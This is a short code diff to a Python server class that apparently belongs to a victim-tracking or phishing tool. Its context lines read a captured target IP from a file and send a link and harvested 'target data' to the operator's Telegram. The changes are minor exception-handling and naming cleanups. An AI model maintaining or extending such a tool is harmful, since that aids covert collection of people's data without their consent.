@@ -398,7 +398,7 @@ class MainServer:
                         f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                     self.tprint.out(
                         LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
-                except:
+                except Exception as error:
                     self.tprint.out(LR + " [>]" + LY + " Failed to send the link to your " +
                                     LW + "telegram " + LY + "!")
                     print("")
@@ -436,8 +436,8 @@ class MainServer:
         if stat(file_path_ip).st_size != 0:
             with open(file_path_ip, "r") as ip_file:
                 file_lines = ip_file.readlines()
-                TARGET_IP = file_lines[-1]
-            return TARGET_IP
+                target_ip = file_lines[-1]
+            return target_ip
         else:
             return None
 
@@ -536,7 +536,7 @@ class MainServer:
                                                       parse_mode="Markdown")
                         tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
                         print("")
-                    except:
+                    except Exception as error:
                         tprint.out(LR + " [>]" + LY + " Failed to send the target data to your " +
                                    LW + "telegram " + LY + "! (check your connection)")
                         print("")
